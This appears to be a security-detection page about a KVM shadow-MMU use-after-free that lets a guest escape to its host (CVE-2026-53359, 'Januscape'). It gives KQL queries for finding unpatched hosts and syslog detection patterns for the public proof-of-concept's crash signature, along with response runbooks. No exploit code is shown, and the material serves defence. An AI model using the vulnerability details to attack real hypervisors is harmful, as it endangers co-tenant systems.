A use-after-free bug in Linux's KVM hypervisor can be triggered from a guest virtual machine to corrupt the shadow-page state of the host kernel that runs it. Dubbed 'Januscape' and tracked as&nbsp;CVE-2026-53359, the flaw sits in the shadow MMU code that KVM shares across both Intel and AMD. The public proof-of-concept panics the host; the researcher claims that a separate, unreleased exploit

Unpatched x86 KVM host exposed to Januscape guest-to-host escape (CVE-2026-53359) AIExploitation Medium
Surfaces Linux hosts still carrying the vulnerable KVM shadow-MMU code (kernels older than the July 4 2026 stable fixes / missing commit 81ccda30b4e8) so they can be prioritised for patching before a rented guest with nested virtualization can panic or escape to the host. Article-specific because it pins the exact CVE and the shipped fixed versions. Rationale: Pins the concrete CVE-2026-53359 and the fixed stable trains (7.1.3 / 6.18.38 / 6.12.95 / 6.6.144 / 6.1.177 / 5.15.211 / 5.10.260, commit 81ccda30b4e8) named in the article; a TVM CVE lookup is exact and low-noise. Distro backports may carry the fix under a different version so the recommended-update field must be checked rather than uname alone. Cross-checked against: • https://nvd.nist.gov/vuln/detail/CVE-2026-53359 • https://github.com/V4bel/Januscape • https://git.almalinux.org/rpms/kernel/commit/5ff608da797cb293d172082b5f4fffbcbd9b55a2
ATT&CKT1611 T1068
Data sourcesVulnerabilities.Vulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Host was patched via distro backport that keeps an old-looking version string, so it appears vulnerable but is not (check package changelog / RecommendedSecurityUpdate)
  • TVM has not yet catalogued CVE-2026-53359 (NVD unscored at disclosure) so the query returns empty on hosts that are actually exposed
  • Linux appliance images where the kernel is vendor-frozen and TVM reports the base OS version, not the running kernel
  • Hosts that expose no nested virtualization (kvm_intel.nested=0 / kvm_amd.nested=0) are technically vulnerable in code but not reachable by untrusted guests
Suppression filter
| where RecommendedSecurityUpdate != "" and VulnerabilitySeverityLevel in ("Critical","High","Medium")
Response runbook
1) Triage: confirm the host actually runs KVM and accepts multi-tenant/untrusted guests, and check whether nested virtualization is enabled (cat /sys/module/kvm_intel/parameters/nested or kvm_amd) — only nested-exposed hosts are reachable. 2) Contain: if patching cannot happen immediately, set kvm_intel.nested=0 / kvm_amd.nested=0 to remove the guest-reachable path, and restrict /dev/kvm permissions on RHEL-like hosts where it is world-writable (0666). 3) Hunt: verify the running kernel includes commit 81ccda30b4e8 via the package changelog, then pivot to UC 'KVM shadow-MMU host panic' on the same hosts to check for exploitation attempts.

| where OSPlatform startswith "Linux"
| summarize arg_max(Timestamp, *) by DeviceId
| project DeviceName, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate, VulnerabilitySeverityLevel
| sort by DeviceName asc

KVM shadow-MMU use-after-free host panic (Januscape PoC signature) AIActions on Objectives Medium
Detects the observable of the public Januscape proof-of-concept: a guest-triggered use-after-free / KASAN report or kernel panic whose stack localises to KVM shadow-MMU code (kvm_mmu_get_child_sp) on the host. A single guest can knock over the whole hypervisor and every co-tenant VM, so this is a high-priority DoS/exploitation signal. Rationale: The article and PoC state the public exploit reliably panics the host with the crash localised to the shadow MMU and names the fixed function kvm_mmu_get_child_sp; a KASAN/UAF or kernel-panic syslog line co-occurring with 'kvm' is high-fidelity for an exploitation attempt. Defender/Falcon left empty because host kernel-panic telemetry is not shipped by Defender XDR or the FDR event schema — this signal lives in host syslog/dmesg (Sentinel Syslog, Datadog linux.syslog). Cross-checked against: • https://github.com/V4bel/Januscape • https://nvd.nist.gov/vuln/detail/CVE-2026-53359 • https://lowendtalk.com/discussion/218905/januscape-guest-to-host-escape-in-kvm-x86-cve-2026-53359
ATT&CKT1499.004 T1611
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Genuine (non-malicious) KVM bug or hardware fault producing a kvm-related oops after a kernel upgrade
  • KASAN/lockdep debug kernels in a QA/dev fleet that log verbose 'BUG:'/'use-after-free' traces routinely
  • Memory-pressure OOM or ECC/hardware GPF that happens to include kvm frames on the stack
  • Security researchers or internal red team running the Januscape PoC in an authorised lab
Suppression filter
| where SeverityLevel in ("error","crit","alert","emerg") or SyslogMessage has_any ("use-after-free","kvm_mmu_get_child_sp")
Response runbook
1) Triage: pull the full dmesg/journal around the event, confirm the faulting stack references KVM MMU frames (kvm_mmu_get_child_sp / __kvm_mmu_get_shadow_page) rather than an unrelated subsystem, and identify which guest was running at the time. 2) Contain: cordon the hypervisor, live-migrate or isolate co-tenant VMs, and quarantine the suspect guest instance; if the host is unpatched, disable nested virtualization fleet-wide as an emergency control. 3) Hunt: cross-reference UC 'Unpatched x86 KVM host' to confirm the host lacked commit 81ccda30b4e8, and check the suspect guest for a recently loaded out-of-tree kernel module (UC 'Out-of-tree kernel module load on KVM host/guest').
Syslog
| where TimeGenerated > ago(7d)
| where Facility in ("kern","kernel")
| where SyslogMessage has "kvm"
| where SyslogMessage has_any ("use-after-free","KASAN","kvm_mmu_get_child_sp","Kernel panic - not syncing","general protection fault","BUG: unable to handle")
| project TimeGenerated, Computer, HostIP, Facility, SeverityLevel, SyslogMessage
| sort by TimeGenerated desc
